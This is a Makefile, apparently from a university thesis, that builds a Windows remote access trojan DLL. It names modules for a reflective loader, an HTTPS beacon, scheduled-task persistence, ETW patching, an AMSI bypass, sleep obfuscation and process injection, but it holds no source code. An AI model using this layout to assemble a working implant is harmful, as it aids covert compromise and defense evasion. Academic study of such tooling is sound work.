# Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
CC      = x86_64-w64-mingw32-gcc
AS      = nasm
TARGET  = rat.dll

SRCS    = src/rat.c \
          src/ReflectiveLoader.c \
          src/transport/https_beacon.c \
          src/persistence/scheduled_task.c \
          src/evasion/etw_patch.c \
          src/evasion/amsi_bypass.c \
          src/evasion/ekko.c \
          src/process_inject.c

ASRCS   = src/peb_walk.asm
AOBJS   = src/peb_walk.obj

LIBS    = -lwinhttp -lws2_32 -ltaskschd -lole32 -loleaut32 -lshlwapi

CFLAGS  = -O2 -DNDEBUG -shared -fPIC \
          -fvisibility=hidden \
          -fno-omit-frame-pointer \
          -Isrc \
          -Wno-incompatible-pointer-types

all: $(TARGET)

$(AOBJS): $(ASRCS)
	$(AS) -f win64 -o $(AOBJS) $(ASRCS)

$(TARGET): $(AOBJS) $(SRCS)
	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) $(AOBJS) $(LIBS)

clean:
	rm -f $(TARGET) rat.exe $(AOBJS)
